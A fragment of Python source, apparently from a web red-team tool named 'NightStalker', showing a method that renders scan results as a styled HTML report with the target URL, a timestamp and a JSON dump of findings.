            html_report = self._generate_html_report(data)
            
            with open(output_file, 'w') as f:
                f.write(html_report)
            
            return output_file
            
        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            return f"Error: {e}"
    
    def _generate_html_report(self, data: Dict[str, Any]) -> str:
        """Generate HTML report from scan data"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>NightStalker Web Red Team Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; }}
        .section {{ margin: 20px 0; padding: 15px; border: 1px solid #ddd; }}
        .finding {{ margin: 10px 0; padding: 10px; background: #f8f9fa; }}
        .vulnerable {{ background: #f8d7da; border-left: 4px solid #dc3545; }}
        .info {{ background: #d1ecf1; border-left: 4px solid #17a2b8; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>NightStalker Web Red Team Report</h1>
        <p>Target: {data.get('url', 'Unknown')}</p>
        <p>Generated: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(data.get('timestamp', time.time())))}</p>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>Comprehensive web security assessment completed with findings categorized by severity.</p>
    </div>
    
    <div class="section">
        <h2>Technical Findings</h2>
        <pre>{json.dumps(data, indent=2)}</pre>
    </div>
</body>
</html>
        """
        return html 